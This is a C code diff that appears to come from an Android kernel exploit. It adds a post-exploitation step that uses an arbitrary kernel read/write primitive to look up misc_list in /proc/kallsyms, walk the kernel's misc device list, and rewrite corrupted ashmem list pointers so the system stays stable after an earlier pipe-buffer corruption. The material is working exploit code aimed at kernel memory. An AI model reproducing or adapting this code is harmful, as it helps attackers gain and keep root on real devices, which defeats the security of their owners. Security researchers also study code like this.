@@ -1,5 +1,6 @@
 #include "common.h"
 
+#include <stdio.h>
 #include <stdlib.h>
 #include <sys/un.h>
 
@@ -601,6 +602,80 @@ cleanup:
       int w = root_write_data(fd, ops_addr, &zero, sizeof(zero));
       pr_info("root pipebuf[%zu] nulled ops page=%016llx pfn=%zx write=%d\n",
               i, (unsigned long long)cur_page, pfn, w);
+    }
+#endif
+
+#if defined(ASHMEM_MISC_OFF)
+    {
+      uintptr_t ashmem_list_direct = data_direct_addr(ASHMEM_MISC_FOPS) + 8;
+      uintptr_t ashmem_list_canon = canon_addr(ASHMEM_MISC_FOPS) + 8;
+      uint64_t cur_next = 0, cur_prev = 0;
+      root_read_data(fd, ashmem_list_direct, &cur_next, 8);
+      root_read_data(fd, ashmem_list_direct + 8, &cur_prev, 8);
+      pr_info("misc-list: ashmem list.next=%016llx list.prev=%016llx\n",
+              (unsigned long long)cur_next, (unsigned long long)cur_prev);
+
+      if (cur_next < 0xffffffc000000000ULL || cur_prev < 0xffffffc000000000ULL) {
+        FILE *ksyms = fopen("/proc/kallsyms", "r");
+        uintptr_t misc_list_canon = 0;
+        if (ksyms) {
+          char line[256];
+          while (fgets(line, sizeof(line), ksyms)) {
+            uintptr_t addr; char type; char name[128];
+            if (sscanf(line, "%lx %c %127s", &addr, &type, name) == 3 &&
+                strcmp(name, "misc_list") == 0) {
+              misc_list_canon = addr;
+              break;
+            }
+          }
+          fclose(ksyms);
+        }
+        if (!misc_list_canon) {
+          pr_warning("misc-list: misc_list not found in kallsyms\n");
+        } else {
+          uintptr_t delta = KIMAGE_TEXT_BASE - P0_PAGE_OFFSET;
+          uintptr_t ml_direct = misc_list_canon - delta;
+          pr_info("misc-list: misc_list canon=%016zx direct=%016zx\n",
+                  misc_list_canon, ml_direct);
+
+          uintptr_t before_canon = misc_list_canon;
+          uint64_t walk = 0;
+          root_read_data(fd, ml_direct, &walk, 8);
+          int steps = 0;
+          while (walk != misc_list_canon && walk != 0 && steps < 256) {
+            if (walk == ashmem_list_canon) break;
+            before_canon = walk;
+            root_read_data(fd, (uintptr_t)(walk - delta), &walk, 8);
+            steps++;
+          }
+
+          uintptr_t after_canon = misc_list_canon;
+          uint64_t rwalk = 0;
+          root_read_data(fd, ml_direct + 8, &rwalk, 8);
+          steps = 0;
+          while (rwalk != misc_list_canon && rwalk != 0 && steps < 256) {
+            if (rwalk == ashmem_list_canon) break;
+            after_canon = rwalk;
+            root_read_data(fd, (uintptr_t)(rwalk - delta) + 8, &rwalk, 8);
+            steps++;
+          }
+
+          if (walk == ashmem_list_canon && rwalk == ashmem_list_canon) {
+            uint64_t fix_next = after_canon;
+            uint64_t fix_prev = before_canon;
+            int w1 = root_write_data(fd, ashmem_list_direct, &fix_next, 8);
+            int w2 = root_write_data(fd, ashmem_list_direct + 8, &fix_prev, 8);
+            pr_info("misc-list: repaired next=%016llx(%d) prev=%016llx(%d)\n",
+                    (unsigned long long)fix_next, w1,
+                    (unsigned long long)fix_prev, w2);
+          } else {
+            pr_warning("misc-list: walk failed fwd=%016llx rev=%016llx\n",
+                       (unsigned long long)walk, (unsigned long long)rwalk);
+          }
+        }
+      } else {
+        pr_info("misc-list: pointers valid, no repair needed\n");
+      }
     }
 #endif
   }
